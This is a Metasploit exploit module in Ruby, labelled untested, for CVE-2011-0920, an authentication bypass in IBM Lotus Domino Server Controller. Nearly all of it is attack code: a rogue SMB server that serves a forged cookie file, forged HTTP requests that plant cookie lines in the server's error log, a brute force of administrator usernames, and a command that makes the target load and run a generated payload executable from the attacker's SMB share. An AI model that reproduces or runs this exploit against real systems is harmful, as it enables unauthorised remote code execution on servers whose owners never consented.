
require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::SMBServer

  def initialize(info ={})
    super(
    'Name'	      => '[UNTESTED] IBM Lotus Domino Server Controller Authentication Bypass',
    'Description'	=> %q{
      This module exploits a authentication bypass in Lotus Domino Server Controller 8.0.x -. There are 3 way	to exploit this vulnereability:
      1) Authenticate in lotus console using	UNC path to cookie file on smb share. It was fixed in 8.5.3.
      2) Authenticate in lotus console using server log file.
      3) SMB relay. Also was fixed in 8.5.3.
      This module exploit 1 and 2 way.  Since version 8.5.3 console use client ssl cert.
    },
    'License'	 => MSF_LICENSE,
    'Author'	      => 
      [
        'Alexander Minozhenko', # author measploit module
        'Alexey Sintsov', # dicovery exploit via http log file
        'Patrik Karlsson' #original discovery
      ],
    'References'	 =>
      [ 
        ['CVE','2011-0920'],
        ['EDB','18179']
      ],
    'Payload'	      => {},
    'Targets'	      => [ ['Automatic', {} ] ],
    'Platform'	 => 'win',
    'DisclosureDate' => 'Mar 22 2011'
    )
    register_options( [
        Opt::RPORT(2050),
        OptInt.new('HTTPPORT',[false, 'Port of http server',47001]),
        OptString.new('HTTPLOGPATH',[false, 'Path to log on the server',"..\\..\\..\\..\\..\\windows\\system32\\logfiles\\httperr\\httperr1"]),
        OptPath.new('SSLCert',	  [ false, 'Path to a lotus SSL certificate']),
        OptPath.new('SSLKey',	 [ false, 'Path to a lotus SSL private key']),
        OptEnum.new('Method',[false,'Method using for exploitation','cookiefile',['cookiefile','logfile']])
        ], self.class)
    @count_buf = 0
    @files = {}
  end

  
  SMB_QUERY_FILE_BASIC_INFO = Rex::Struct2::CStructTemplate.new(
                [ 'uint64v', 'CreationTime', 0],
                [ 'uint64v', 'LastAccessTime', 0],
                [ 'uint64v', 'LastWriteTime', 0],
                [ 'uint64v', 'LastChangeTime', 0],
                [ 'uint32v', 'FileAttr', 20],
                [ 'uint32v', 'Reserved',0]
                )

  SMB_QUERY_FILE_NETWORK_OPEN_INFO = Rex::Struct2::CStructTemplate.new(
                [ 'uint64v', 'CreationTime', 0],
                [ 'uint64v', 'LastAccessTime', 0],
                [ 'uint64v', 'LastWriteTime', 0],
                [ 'uint64v', 'LastChangeTime', 0],
                ['uint64v','AllocationSize', 0],
                ['uint64v','EndOfFile',0],
                [ 'uint32v', 'FileAttr', 20],
                [ 'uint32v', 'Reserved',0]
                )

  SMB_QUERY_FILE_STANDART_INFO = Rex::Struct2::CStructTemplate.new(
                ['uint64v','AllocationSize', 0],
                ['uint64v','EndOfFile',0],
                ['uint32v','NumberOfLinks',1],
                ['uint8','DeletePending',0],
                ['uint8','Directory',0]
                )

  SMB_FIND_FILE_BOTH_DIRECTORY_INFO = Rex::Struct2::CStructTemplate.new(
                  ['uint16v','Padding',0],
                  ['uint32v','NextEntryOffset',0],
                  ['uint32v','FileIndex',0],
                  [ 'uint64v', 'CreationTime', 0],
                  [ 'uint64v', 'LastAccessTime', 0],
                  [ 'uint64v', 'LastWriteTime', 0],
                  [ 'uint64v', 'LastChangeTime', 0],
                  ['uint64v','EndOfFile',0],
                  ['uint64v','AllocationSize', 0],
                  [ 'uint32v', 'FileAttr', 0x20],
                  [ 'uint32v','FileNameLen',0],
                  [ 'uint32v','EAListLength',0],
                  [ 'uint8','ShortFileNameLen',0],
                  [ 'uint8', 'Reserved',0],
                  ['string','ShortFileName',nil,''],
                  [ 'string','FileName',nil,'']
                  )							     
  
  def connect(global = true, opts={})

    dossl = true

    nsock = Rex::Socket::Tcp.create(
          'PeerHost'  =>	datastore['RHOST'],
          'PeerPort'  => (datastore['RPORT']).to_i,
          'LocalHost' =>	datastore['CHOST'] || "0.0.0.0",
          'LocalPort' => (datastore['CPORT'] || 0).to_i,
          'SSL'	    =>	dossl,
          'SSLVersion'=>	datastore['SSLVersion'],
          'SSLKey' => datastore['SSLKey'],
          'SSLCert' => datastore['SSLCert'],
          'Timeout'   => (datastore['ConnectTimeout'] || 10).to_i,
          'Context'   =>
          {
            'Msf'	     => framework,
            'MsfExploit' => self,
          })



    # enable evasions on this socket
    set_tcp_evasions(nsock)

    # Set this socket to the global socket as necessary
    self.sock = nsock if (global)

    # Add this socket to the list of sockets created by this exploit
    add_socket(nsock)

    return nsock
  end




  def get_allocsize(size)
    clust_size = 4096
    if size <= 1024
      return 1024
    else
      num = size / clust_size
      c = size % clust_size
      if c==0
        return num* clust_size
      else
        return (num+1) * clust_size
      end
    end
  end
  
  def smb_cmd_negotiate(c, buff)
    smb = @state[c]
    pkt = CONST::SMB_NEG_PKT.make_struct
    pkt.from_s(buff)

    # Record the remote process ID
    smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']


    dialects = pkt['Payload'].v['Payload'].gsub(/\x00/, '').split(/\x02/).grep(/^\w+/)


    dialect =
      dialects.index("NT LM 0.12") ||
      dialects.length-1
    
    
    pkt = CONST::SMB_NEG_RES_NT_PKT.make_struct
    smb_set_defaults(c, pkt)

    time_hi, time_lo = UTILS.time_unix_to_smb(Time.now.to_i)

    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NEGOTIATE
    pkt['Payload']['SMB'].v['Flags1'] = 0x98
    pkt['Payload']['SMB'].v['Flags2'] = 0xc853
    pkt['Payload']['SMB'].v['WordCount'] = 17
    pkt['Payload'].v['Dialect'] = dialect
    pkt['Payload'].v['SecurityMode'] = 3
    pkt['Payload'].v['MaxMPX'] = 2
    pkt['Payload'].v['MaxVCS'] = 1
    pkt['Payload'].v['MaxBuff'] = 4356
    pkt['Payload'].v['MaxRaw'] = 65536
    pkt['Payload'].v['Capabilities'] = 0x8000e3fd 
    pkt['Payload'].v['ServerTime'] = time_lo
    pkt['Payload'].v['ServerDate'] = time_hi
    pkt['Payload'].v['Timezone']   = 0x0


    pkt['Payload'].v['SessionKey'] = 0
    pkt['Payload'].v['KeyLength'] = 8
    
    pkt['Payload'].v['Payload'] = "\x00"*16

    
    c.put(pkt.to_s)
  end
  
  def smb_cmd_session_setup(c, buff)
    smb = @state[c]
    pkt = CONST::SMB_SETUP_NTLMV1_PKT.make_struct
    pkt.from_s(buff)
    
    smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
    smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
    smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
    smb[:user_id] =	 pkt['Payload']['SMB'].v['UserID']
    
    pkt = CONST::SMB_SETUP_RES_PKT.make_struct

    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_SESSION_SETUP_ANDX
    pkt['Payload']['SMB'].v['ProcessID'] = smb[:process_id].to_i
    pkt['Payload']['SMB'].v['UserID'] = rand(0xffff)
    pkt['Payload']['SMB'].v['MultiplexID'] = smb[:multiplex_id].to_i
    pkt['Payload'].v['WordCount']=4
    
    pkt['Payload'].v['AndX'] = 0xff
    data = "\x00\x00"*2
    pkt['Payload'].v['ByteCount'] = data.length
    pkt['Payload'].v['Payload'] = data
    pkt['Payload']['SMB'].v['Flags1']  = 0x98
    pkt['Payload']['SMB'].v['Flags2']  = 0xc807

    c.put(pkt.to_s)
  end
  
  def smb_cmd_tree_connect_andx(c, buff)
    smb = @state[c]
    pkt = CONST::SMB_TREE_CONN_PKT.make_struct

    pkt.from_s(buff)
    smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
    smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
    smb[:user_id] =	 pkt['Payload']['SMB'].v['UserID']
    path = pkt['Payload'].v['Payload']['Path']
    service = pkt['Payload'].v['Payload']['Service']
    payload = pkt['Payload'].v['Payload']

    pkt = CONST::SMB_TREE_CONN_EXT_RES_PKT.make_struct

    smb_set_defaults(c,pkt)
    smb[:tree_id] = rand(0xffff)
    pkt['Payload']['SMB'].v['TreeID'] = smb[:tree_id]
    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TREE_CONNECT_ANDX
    pkt['Payload'].v['AndX'] = 0xff
    pkt['Payload']['SMB'].v['Flags1']  = 0x98
    pkt['Payload']['SMB'].v['Flags2']  = 0xc807
    pkt['Payload']['SMB'].v['WordCount'] = 0x07
    pkt['Payload'].v['MaximalShareAccessRights'] = 0x001301bf
    pkt['Payload'].v['Payload']  = "A:\x00"+ Rex::Text.to_unicode("NTFS")+"\x00\x00"

    c.put(pkt.to_s)

  end

  def smb_cmd_nt_create(c, buff)
    smb = @state[c]
    pkt = CONST::SMB_CREATE_PKT.make_struct
    pkt.from_s(buff)
    smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
    
    smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
    smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
    smb[:user_id] =	 pkt['Payload']['SMB'].v['UserID']

    smbpayload = pkt['Payload'].v['Payload'].to_s[1..-1].split("\x00").join()


    pkt = CONST::SMB_CREATE_RES_PKT.make_struct
    pkt.from_s(buff)
    smb_set_defaults(c,pkt)
    pkt['Payload']['SMB'].v['Flags1']  = 0x98
    pkt['Payload']['SMB'].v['Flags2']  = 0xc807
    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_CREATE_ANDX

    if not @files.include?smbpayload
      pkt['Payload']['SMB'].v['ErrorClass'] = 0xc0000034
      pkt['Payload'].v['FileID'] = 0
      c.put(pkt.to_s)
      return
    end
    
    @fileid = @fileid+1
    pkt['Payload'].v['Action'] = 1
    pkt['Payload'].v['FileID'] = @fileid

    pkt['Payload'].v['IPCState'] = 0x0007
    pkt['Payload'].v['OpLock'] = 0x02
    pkt['Payload']['SMB'].v['WordCount'] = 42
    pkt['Payload'].v['Attributes'] = 0x00000020
    pkt['Payload'].v['AllocHigh'] = 0
    pkt['Payload'].v['AllocLow'] = get_allocsize(@files[smbpayload].length) #TODO: make on variable
    pkt['Payload'].v['EOFLow'] = @files[smbpayload].length
    pkt['Payload'].v['EOFHigh'] = 0 
    pkt['Payload'].v['FileType'] = 0x0000
    pkt['Payload'].v['IsDirectory'] = 0
    pkt['Payload'].v['Payload'] = ''

    @files[@fileid] = smbpayload
    
    c.put(pkt.to_s)
  end
  
  def set_time(info_struct)
    time= UTILS.time_unix_to_smb(Time.now.to_i).collect{ |x| x.to_s 16 }.reverse.join.to_i 16
    

    info_struct.v['LastAccessTime'] = time
    info_struct.v['CreationTime'] = time
    info_struct.v['LastWriteTime'] =time
    info_struct.v['LastChangeTime'] = time
    return info_struct
  end

  def smb_trans2(c,buff)
    
    smb = @state[c]
    pkt =  CONST::SMB_TRANS2_PKT.make_struct	  
    pkt.from_s(buff)

    smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
    smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
    smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
    smb[:user_id] =	 pkt['Payload']['SMB'].v['UserID']


    filename = (pkt['Payload'].to_s[74..-1]).delete("\x00")


    subcommand = pkt['Payload'].v['SetupData'].unpack('v')
    p=pkt['Payload'].to_s[-8..-1]
    level = p.unpack('vA')[0]

    respkt = CONST::SMB_TRANS_RES_PKT.make_struct
    smb_set_defaults(c,respkt)
    
    respkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TRANSACTION2
    respkt['Payload']['SMB'].v['Flags1']  = 0x98
    respkt['Payload']['SMB'].v['Flags2']  = 0xc807

    if (subcommand[0]  == CONST::TRANS2_QUERY_PATH_INFO)

      rpayload = pkt['Payload'].to_s
      info = SMB_QUERY_FILE_BASIC_INFO.make_struct			
      info_level = rpayload.to_s.split("\x00\x00\x00\x00")[-3].unpack('s')[0]
      if (info_level == 0) 
        q=rpayload.to_s.split("\x00") 
        info_level = rpayload.to_s.split("\x00")[-1].unpack('s')[0]
      end
      
      info = set_time(info)
      
      if @files.include?filename
        allocsize = get_allocsize(@files[filename].length)
        endoffile  = @files[filename].length
      else
        respkt['Payload']['SMB'].v['ErrorClass'] = 0xc0000034
        respkt['Payload']['SMB'].v['WordCount'] = 0
        respkt['Payload'].v['ByteCount'] = 0
        c.put(respkt.to_s)
        return 
      end
      fileattr = 20
      
      respkt['Payload']['SMB'].v['WordCount'] = 10
      respkt['Payload'].v['ParamCountTotal'] = 2
      respkt['Payload'].v['ParamCount' ] = 2
      respkt['Payload'].v['ParamOffset'] = 56 

      if (info_level == 1004)
        
        respkt['Payload'].v['DataCountTotal'] = 40
        respkt['Payload'].v['ByteCount'] = 45 
        respkt['Payload'].v['DataCount'] = 40
        respkt['Payload'].v['DataOffset'] = 60
        info.v['FileAttr']=0x10
        
        respkt['Payload'].v['Payload'] = "\x00" *5 + info.to_s 

        c.put(respkt.to_s)
        
      elsif (info_level == 1005)
        
        respkt['Payload'].v['ParamCountTotal'] = 2
        respkt['Payload'].v['ParamCount' ] = 2
        respkt['Payload'].v['DataOffset'] = 60
        respkt['Payload'].v['ParamOffset'] = 56
        info = SMB_QUERY_FILE_STANDART_INFO.make_struct
        isdir = 0 
        if (filename == "")					
          allocsize = 0
          endoffile = 0 
          isdir = 1
        end
        info.v['AllocationSize'] = allocsize
        info.v['EndOfFile'] = endoffile
        p=[allocsize , endoffile , 1,0,isdir,0].pack('QQLCCS')

        respkt['Payload'].v['DataCount'] = p.length
        p2 = "\x00" * 5 +  p 
        respkt['Payload'].v['Payload'] = p2
        respkt['Payload'].v['ByteCount'] =  p2.length
        respkt['Payload'].v['DataCountTotal'] = p.length
        
        c.put(respkt.to_s)
        
      elsif (info_level == 1034)

        info = SMB_QUERY_FILE_NETWORK_OPEN_INFO.make_struct
        info = set_time(info)
        info.v['AllocationSize'] = get_allocsize(@cookiefile.length)
        info.v['EndOfFile'] = @cookiefile.length
        respkt['Payload'].v['DataOffset'] = 60
        respkt['Payload'].v['DataCount'] = 56
        respkt['Payload'].v['DataCountTotal'] = 56
        p = "\x00" * 5 + info.to_s
        respkt['Payload'].v['Payload'] = p
        respkt['Payload'].v['ByteCount'] =  p.length

        c.put(respkt.to_s)

      end
      
    elsif (subcommand[0] == CONST::TRANS2_QUERY_FILE_INFO)

      
      respkt['Payload'].v['DataCount' ] =8
      respkt['Payload'].v['DataOffset'] = 60
      respkt['Payload'].v['ParamCount'] =2 
      respkt['Payload'].v['ParamCountTotal'] =2 
      respkt['Payload'].v['ParamOffset'] = 56
      respkt['Payload'].v['DataCountTotal' ] =8
      respkt['Payload']['SMB'].v['WordCount' ] =10
      
      p = [0,0,0x000100000000456e].pack('CLQ')
      respkt['Payload'].v['Payload'] = p
      respkt['Payload'].v['ByteCount'] = p.length
      
      c.put(respkt.to_s)
      
      
    elsif (subcommand[0] == CONST::TRANS2_FIND_FIRST2)
      pkt_data   = pkt.to_s[-43..-1]
      level = pkt_data.delete("\x00").unpack('SSSS')[2]
      filename = (pkt['Payload'].to_s[76..-1]).delete("\x00")
      filename = "" if filename == "\\*"
      allocsize = get_allocsize(@files[filename].length)
      endoffile  = @files[filename].length
      fileattr = 0x20
      respkt['Payload'].v['DataCountTotal'] =	  124
      respkt['Payload'].v['DataCount'] =   124
      respkt['Payload'].v['DataOffset'] = 68
      respkt['Payload'].v['ParamCount'] = 10 
      respkt['Payload'].v['ParamCountTotal'] = 10
      respkt['Payload'].v['ParamOffset'] = 56
      respkt['Payload']['SMB'].v['WordCount'] = 10

      parametrs = [0x0800,1,1,0,0].pack('SSSSS')
      filename = filename[1..-1].split("").collect{ |x| x+"\x00"}.join() unless filename == ""
      file_len = filename.length
      
      if level == 260
        data = SMB_FIND_FILE_BOTH_DIRECTORY_INFO.make_struct
        data = set_time(data)
        data.v['EndOfFile'] = endoffile
        data.v['AllocationSize'] =  allocsize
        data.v['FileNameLen'] = file_len
        data.v['FileName'] = filename
        data.v['ShortFileName'] = "\x00"*file_len
        data.v['FileAttr'] = fileattr

        p = "\x00"+parametrs + data.to_s + "\x00"*6
      elsif level == 259
        respkt['Payload'].v['DataCountTotal'] =	  36
        respkt['Payload'].v['DataCount'] =   36
        data= [0,0,file_len,filename].pack('LLLA*')
        p = "\x00"+parametrs+"\x00\x00" +data
      end
      respkt['Payload'].v['Payload'] = p
      respkt['Payload'].v['ByteCount'] = p.length
      c.put(respkt.to_s)
    end

    
  end
  

  def smb_read(c, buff)
    smb = @state[c]
    
    pkt =  CONST::SMB_READ_PKT.make_struct		
    pkt.from_s(buff)
    
    smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
    smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
    smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
    smb[:user_id] =	 pkt['Payload']['SMB'].v['UserID']
    fileid = pkt['Payload'].v['FileID'].to_i
    num_bytes = pkt['Payload'].v['MaxCountLow'].to_i
    offset = pkt['Payload'].v['Offset'].to_i
    
    pkt = CONST::SMB_READ_RES_PKT.make_struct
    smb_set_defaults(c,pkt)
    pkt['Payload']['SMB'].v['Flags1'] = 0x98 
    pkt['Payload']['SMB'].v['Flags2'] = 0xe807
    pkt['Payload']['SMB'].v['WordCount'] = 12
    
    
    fname = @files[fileid]
    @file = @files[fname][offset..offset+num_bytes-1]
    print_status("Sending file #{fname}")

    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_READ_ANDX
    pkt['Payload'].v['AndX'] = 0xff
    pkt['Payload'].v['DataLenLow'] = @file.length
    pkt['Payload'].v['DataOffset'] = 60
    pkt['Payload'].v['Remaining']= 0xffff
    pkt['Payload'].v['AnxOffset'] =0
    pkt['Payload'].v['DataCompaction'] =0
    pkt['Payload'].v['Reserverd1'] =0
    pkt['Payload'].v['DataLenHigh'] =0
    pkt['Payload'].v['Reserverd2'] = 0
    pkt['Payload'].v['Reserverd3'] = 0
    pkt['Payload'].v['Reserverd4'] = 0
    pkt['Payload'].v['Payload'] = "\x00" + @file

    c.put(pkt.to_s)
  end

  def smb_close(c, buff)
    smb = @state[c]
    pkt = CONST::SMB_CLOSE_PKT.make_struct
    
    pkt.from_s(buff)
    
    smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
    smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
    smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
    smb[:user_id] =	 pkt['Payload']['SMB'].v['UserID']
    
    pkt  = CONST::SMB_CLOSE_RES_PKT.make_struct
    smb_set_defaults(c,pkt)
    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_CLOSE
    pkt['Payload']['SMB'].v['Flags1']  = 0x98
    pkt['Payload']['SMB'].v['Flags2']  = 0xc807

    c.put(pkt.to_s)
  end
  
  def smb_tree_disconnect(c, buff)
    smb = @state[c]
    pkt = CONST::SMB_TREE_DISCONN_PKT.make_struct
    
    pkt.from_s(buff)
    
    smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
    smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
    smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
    smb[:user_id] =	 pkt['Payload']['SMB'].v['UserID']
    
    pkt  = CONST::SMB_TREE_DISCONN_RES_PKT.make_struct
    smb_set_defaults(c,pkt)
    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TREE_DISCONNECT
    pkt['Payload']['SMB'].v['Flags1']  = 0x98
    pkt['Payload']['SMB'].v['Flags2']  = 0xc807

    c.put(pkt.to_s)
  end

  def smb_nt_transact(c ,buff)
    smb = @state[c]
    pkt = CONST::SMB_NTTRANS_PKT.make_struct
    
    pkt.from_s(buff)
    
    smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
    smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
    smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
    smb[:user_id] =	 pkt['Payload']['SMB'].v['UserID']

    pkt  = CONST::SMB_NTTRANS_RES_PKT.make_struct
    smb_set_defaults(c,pkt)
    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_TRANSACT
    pkt['Payload']['SMB'].v['Flags1']  = 0x98
    pkt['Payload']['SMB'].v['Flags2']  = 0xc807


    pkt['Payload']['SMB'].v['WordCount'] = 18
    pkt['Payload'].v['DataCountTotal'] =   20
    pkt['Payload'].v['DataCount'] =	  20
    pkt['Payload'].v['DataOffset'] = 76
    pkt['Payload'].v['ParamCount'] = 4
    pkt['Payload'].v['ParamCountTotal'] = 4
    pkt['Payload'].v['ParamOffset'] = 72
    data = [1,0x8000,0,0,0,0].pack('SSLLLL')
    param = [data.length].pack('L')
    p = "\x00"+param+data
    pkt['Payload'].v['Payload'] = p
    pkt['Payload'].v['ByteCount'] =p.length

    c.put(pkt.to_s)
  end
  
  def smb_cmd_dispatch(cmd, c, buff)
    smb = @state[c]
    
    case cmd
    when CONST::SMB_COM_NEGOTIATE
      smb_cmd_negotiate(c, buff)

    when CONST::SMB_COM_SESSION_SETUP_ANDX
      smb_cmd_session_setup(c, buff)

    when CONST::SMB_COM_TREE_CONNECT_ANDX
      smb_cmd_tree_connect_andx(c, buff)
      
    when CONST::SMB_COM_NT_CREATE_ANDX
      smb_cmd_nt_create(c, buff)
      
    when CONST::SMB_COM_TRANSACTION2  
      smb_trans2(c, buff)
    when  CONST::SMB_COM_READ_ANDX
      smb_read(c, buff)

    when CONST::SMB_COM_CLOSE
      smb_close(c, buff)
      
    when CONST::SMB_COM_TREE_DISCONNECT
      smb_tree_disconnect(c, buff)
      
    when CONST::SMB_COM_NT_TRANSACT
      smb_nt_transact(c, buff)

    else
      print_status("Ignoring request from #{smb[:name]} (#{cmd})")
      pkt = CONST::SMB_BASE_PKT.make_struct
      pkt['Payload']['SMB'].v['Command'] = cmd
      pkt['Payload']['SMB'].v['Flags1']  = 0x88
      pkt['Payload']['SMB'].v['Flags2']  = 0xc001
      pkt['Payload']['SMB'].v['ErrorClass'] = 0 # 0xc0000022
      c.put(pkt.to_s)
    end
  end

  def httpport
    datastore['HTTPPORT']
  end

  def httplogpath
    datastore['HTTPLOGPATH']
  end

  def send_http_request(req,opts={})
    
    
    http_sock = Rex::Socket::Tcp.create(
            'PeerHost'	=>  opts['RHOST'] || rhost,
            'PeerPort'	=> (opts['HTTPPORT'] || httpport).to_i,
            'LocalHost' =>  opts['CHOST'] || chost || "0.0.0.0",
            'LocalPort' => (opts['CPORT'] || cport || 0).to_i,
            'Proxies'	=> proxies,
            'Timeout'	=> (opts['ConnectTimeout'] || connect_timeout || 10).to_i,
            'Context'	=>
            {
              'Msf'	 => framework,
              'MsfExploit' => self,
            })

    http_sock.put(req)
    print_status("Sending request #{req.split}")
    http_sock.shutdown
    http_sock.close

  end
  
  def brut_user
    begin_value = 'adminis'
    print_status("Brutforce users with began value: #{begin_value}")
    connect
    for prefix in 'a'..'z'
      username = prefix + begin_value
      sock.put("#UI #{username},pass\n")
      res = sock.get_once
      print_status("Received: #{res.split}")
      if (res =~ /WRONG_PASSWORD/)
        disconnect()
        print_status("Find valid user #{username}")
        return username
      elsif (res =~ /NOT_REG_ADMIN/)
        next
      end
    end
    
    print_status("Does not find valid user ")
    disconnect()
    
    return nil
  end
  def gener_payload
    print_status("Generate payload")
    payload = framework.payloads.create(datastore['PAYLOAD'])
    arch = payload.arch
    plat = payload.platform.platforms
    enc = datastore['ENCODER']
    buf = payload.generate_simple(
          'Format'	  => 'raw',
          'Options'	  => datastore,
          'Encoder'	  => enc)

    exe  = Msf::Util::EXE.to_executable_fmt(framework, arch, plat, buf,'exe-small',{})
    @files['\\npayload.exe'] = exe
  end

  def authorization(path,user='admin',password='pass')
    #
    # Authentificatinog in Lotus Domino Controller
    #

    print_status("Authorization")
    connect

    sock.put("#API\n")
    sock.put("#APPLET\n")
    sock.put("#COOKIEFILE #{path}\n")
    sock.put("#USERADDRESS home\n")

    sock.put("#UI #{user},#{password}\n")
    res=sock.get_once

    print_status("Received: #{res.split}")

    if (res =~ /WRONG_PASSWORD/)
      print_status("Wrong password")
    elsif (res =~ /VALID_USER/) 
      print_status("Valid user")
      gener_payload
      sock.put("#EXIT\n")
      sock.put("LOAD \\\\" << datastore['CHOST'] << "\\public\\payload.exe\n")
      
      return true
    elsif (res =~  /NOT_REG_ADMIN/	and (datastore['Method'] =~ /cookiefile|logfile/ ))
      user = brut_user()
      return authorization(path,user,password) unless user.nil?					    
      disconnect()
      return false
    end
  end


  
  def exploit 
    
    @fileid = 0x4000
    method = datastore['Method'].downcase
    user = 'admin'
    password = "pass"
    start_service()
    @files[""]=""


    if method == 'cookiefile'
      print_status("SMBServer started.")
      
      print_status("Create COOKIEFILE")
      @cookiefile = "	  <user name=\"#{user}\" cookie=\"#{password}\" address=\"home\">\x0d\x0a"
      
      @files['\\cookiefile.xml'] = @cookiefile
      path2cookie = "\\\\" << datastore['CHOST'] << "\\public\\cookiefile.xml"

    elsif (method == 'logfile')


      print_status("SMBServer started.")
      send_http_request("GET <user HTTP/1.0\r\n\r\n")
      send_http_request("GET name=\"#{user}\"cookie=\"#{password}\"address=\"home\"> HTTP/1.0\r\n\r\n")
      path2cookie = httplogpath
      print_status("Waiting")
      select(nil, nil, nil, 30)
    end

    authorization(path2cookie,user,password) 
    self.service.wait	 
  end
end

=begin
Note: We probably need to figure out how to put all the SMB code in the mixin.
Also, this module won't work unless other lib mods are applied, see the pull
request for details:
https://github.com/rapid7/metasploit-framework/pull/246
=end